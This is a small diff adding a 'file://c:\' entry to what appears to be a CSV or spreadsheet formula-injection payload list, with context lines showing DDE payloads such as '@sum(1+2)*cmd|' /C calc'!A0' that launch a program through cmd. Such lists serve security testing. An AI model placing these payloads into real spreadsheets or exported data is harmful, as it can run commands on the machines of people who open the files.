@@ -14,6 +14,7 @@ DDE ("cmd";"/C calc";"!A0")A0
 @sum(1+2)*cmd|' /C calc'!A0
 +sum(1+2)*cmd|' /C calc'!A0
 -sum(1+2)*cmd|' /C calc'!A0
+file://c:\
 
 # HYPERLINK(link_location, [friendly_name])
 =HYPERLINK("http://www.google.com", "Safe Site")
